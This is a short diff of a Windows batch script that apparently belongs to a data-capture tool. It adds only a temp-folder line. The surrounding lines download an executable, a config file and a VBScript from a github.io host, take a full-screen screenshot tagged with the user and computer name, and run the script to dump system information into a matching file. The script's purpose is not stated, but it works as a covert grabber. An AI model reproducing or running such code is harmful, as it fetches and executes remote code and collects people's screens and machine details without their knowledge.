@@ -20,6 +20,8 @@ curl.exe %proxy% https://cryptedlumos.github.io/Capture/speedtest-cli.ini --outp
 curl.exe %proxy% https://cryptedlumos.github.io/Capture/speedtest.exe --output "%appdata%\Ookla\Speedtest CLI\speedtest.exe"
 
 curl.exe %proxy% https://cryptedlumos.github.io/Capture/osinfo.vbs --output "osinfo.vbs"
+
+mkdir "%temp%\resources"
 nircmd.exe savescreenshotfull "%username%@%computername% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
 cscript.exe /nologo osinfo.vbs > "%username%@%computername%.txt"
 echo      =================== >> "%username%@%computername%.txt"
